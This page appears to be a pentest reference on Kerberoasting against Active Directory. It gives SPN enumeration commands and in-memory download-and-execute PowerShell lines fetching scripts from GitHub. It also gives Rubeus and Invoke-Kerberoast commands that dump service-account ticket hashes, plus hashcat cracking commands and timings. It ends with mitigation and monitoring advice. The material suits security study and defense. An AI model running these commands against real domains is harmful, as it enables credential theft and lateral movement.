---
description: https://attack.mitre.org/techniques/T1558/003/
---

# Kerberoasting

**ATT\&CK ID:** [T1558.003](https://attack.mitre.org/techniques/T1558/003/)

**Permissions Required:** <mark style="color:green;">**Valid Domain Account**</mark> | <mark style="color:orange;">**Ability to sniff domain traffic**</mark>

**Description**

Adversaries may abuse a valid Kerberos ticket-granting ticket (TGT) or sniff network traffic to obtain a ticket-granting service (TGS) ticket that may be vulnerable to Brute Force.

Service principal names (SPNs) are used to uniquely identify each instance of a Windows service. To enable authentication, Kerberos requires that SPNs be associated with at least one service logon account (an account specifically tasked with running a service).

Adversaries possessing a valid Kerberos ticket-granting ticket (TGT) may request one or more Kerberos ticket-granting service (TGS) service tickets for any SPN from a domain controller (DC). Portions of these tickets may be encrypted with the RC4 algorithm, meaning the Kerberos 5 TGS-REP etype 23 hash of the service account associated with the SPN is used as the private key and is thus vulnerable to offline Brute Force attacks that may expose plain text credentials.

Cracked hashes may enable Persistence, Privilege Escalation, and Lateral Movement via access to Valid Accounts.

[\[Source\]](https://attack.mitre.org/techniques/T1558/003/)

## Enumeration

{% tabs %}
{% tab title="Windows" %}
CMD

```batch
# Gets all SPNs, Includes machine account SPNs
setspn -T [Domain] -Q */*
```

Powerview

```powershell
Get-DomainUser -SPN | Select SamAccountName,DisplayName,ServicePrincipalName
```

Get-SPNs

{% code overflow="wrap" %}
```powershell
iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/The-Viper-One/RedTeam-Pentest-Tools/main/Kerberoasting/Get-SPNs.ps1")
```
{% endcode %}

<figure><img src="../../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
{% endtab %}

{% tab title="Linux" %}
Impacket&#x20;

```python
GetUserSPNs.py [Domain]/[User]:<Password> -dc-ip [IP] -request
```
{% endtab %}
{% endtabs %}



## Exploitation

{% tabs %}
{% tab title="Windows" %}
Rubeus (Binary)

Documentation: [https://github.com/GhostPack/Rubeus#kerberoast](https://github.com/GhostPack/Rubeus#kerberoast)

```powershell
# Kerberoast all users in Domain and output to file
Rubeus.exe kerberoast /simple /outfile:C:\Temp\Kerbhashes.txt

# Kerberoast all users in alternative Domain
Rubeus.exe kerberoast /nowrap /domain:[Domain]

# Only kerberoast RC4 compatible types
Rubeus.exe kerberoast /nowrap /rc4opsec

# Only kerberoast AES compatible types
Rubeus.exe kerberoast /nowrap /aes

# Specific users
Rubeus.exe kerberoast /user:[User] /nowrap

# List statistics about found Kerberoastable accounts (Quiet)
Rubeus.exe kerberoast /stats
```

Rubeus (PowerShell)

```powershell
# Kerberoast all users in Domain and output to file
Invoke-Rubeus -Command "kerberoast /simple /outfile:C:\Temp\Kerbhashes.txt"

# Kerberoast all users in alternative Domain
Invoke-Rubeus -Command "kerberoast /nowrap /domain:[Domain]"

# Only kerberoast RC4 compatible types
Invoke-Rubeus -Command "kerberoast /nowrap /rc4opsec"

# Only kerberoast AES compatible types
Invoke-Rubeus -Command "kerberoast /nowrap /aes"

# Specific users
Invoke-Rubeus -Command "kerberoast /user:[User] /nowrap"

# List statistics about found Kerberoastable accounts (Quiet)
Invoke-Rubeus -Command "kerberoast /stats"

```

Invoke-Kerberoast

{% hint style="warning" %}
The hashes produced for type 18 and type 17 are not calculated correctly in this script and will not crack. Use Rubeus instead if you need to obtain type 18 or 17 hashes.
{% endhint %}

<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell"><strong># Load into memory
</strong><strong>IEX(IWR https://raw.githubusercontent.com/BC-SECURITY/Empire/main/empire/server/data/module_source/credentials/Invoke-Kerberoast.ps1)
</strong>
# Standard Run
Invoke-Kerberoast | FL

# Dump only hashes in a file
Invoke-Kerberoast -OutputFormat Hashcat | Select-Object -ExpandProperty Hash | Out-File "[Path]" -Encoding "ASCII"
</code></pre>
{% endtab %}

{% tab title="Linux" %}
Impacket

```python
GetUserSPNs.py [Domain]/[User]:<Password> -dc-ip [IP] -request
```

<figure><img src="../../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
{% endtab %}
{% endtabs %}

## Hash Cracking

Good list for cracking: [https://gist.github.com/The-Viper-One/a1ee60d8b3607807cc387d794e809f0b](https://gist.github.com/The-Viper-One/a1ee60d8b3607807cc387d794e809f0b)

```bash
hashcat -m 13100 -a 0 -O hashes.txt rockyou.txt -r rules.rule

etype           Value        Hashcat mode
AES128           17            19600
AES256           18            19700
RC4              23            13100
```

### Cracking time between RC4 and AES256 (Dictionary)

<table><thead><tr><th width="154">GPU</th><th>Wordlist</th><th width="87">Rule</th><th>Attempts</th><th width="146">AES256 Time</th><th>RC4 Time</th></tr></thead><tbody><tr><td>GTX 980</td><td>Rockyou</td><td>Best64</td><td>1 Billion</td><td>1 hour, 22 mins</td><td>9 Seconds</td></tr><tr><td>RTX 3090 x 2 + RTX3070</td><td>Rockyou</td><td>Best64</td><td>1 Billion</td><td>7 Minutes, 13 Seconds</td><td>Instant</td></tr><tr><td>GTX 980</td><td>rockyou2021</td><td>Best64</td><td>651 Billion</td><td>36 Days</td><td>1 Hour, 56 minutes</td></tr><tr><td>RTX 3090 x 2 + RTX3070</td><td>rockyou2021</td><td>Best64</td><td>651 Billion</td><td>3 Days, 2 hours</td><td>4 mins, 50 seconds</td></tr></tbody></table>

### Cracking time between RC4 and AES256 (bruteforce)

<table><thead><tr><th width="250">GPU</th><th width="167.33333333333331">AES256 Time</th><th width="176">RC4 Time</th><th>Pass Length</th></tr></thead><tbody><tr><td>GTX 980</td><td>Basically forever</td><td>173 years, 22 days</td><td>9</td></tr><tr><td>RTX 3090 x 2 + RTX3070</td><td>Basically forever</td><td>6 years, 25 days</td><td>9</td></tr></tbody></table>



## Mitigation

1. Maintain service account passwords with a minimum length of 25 characters and ensure they are generated using a completely random process.
2. Implement regular password rotations for service accounts to enhance security.
3. Ensure service accounts have minimal permissions within the domain
4. Enforce the usage of AES256 encryption instead of RC4 for Kerberos authentication.
5. Ensure that your Key Distribution Center (KDC) is running at least Windows Server 2019. Older server versions may default to using RC4 encryption when an encryption downgrade request is initiated.
6. Whenever feasible, leverage Group Managed Service Accounts (GMSA) for service account management.

## Monitoring

Regularly review Windows Event Logs, specifically the Security event log. Look for Event ID 4769 (Kerberos service ticket requests) that indicate service ticket requests for accounts. Unusual or suspicious patterns should be investigated.

Deploy honeytokens or honeyaccounts, which are fake accounts or credentials that are monitored. If these are accessed, it could indicate an attacker attempting to perform kerberoasting based attack.

Monitor for LDAP queries which may be used to discover accounts with SPNs. This is often performed by adversaries to perform initial discovery:&#x20;

```
(servicePrincipalName=*)
```

## References

* [https://adsecurity.org/?p=3458](https://adsecurity.org/?p=3458)
* [https://redsiege.com/tools-techniques/2020/10/detecting-kerberoasting/](https://redsiege.com/tools-techniques/2020/10/detecting-kerberoasting/)
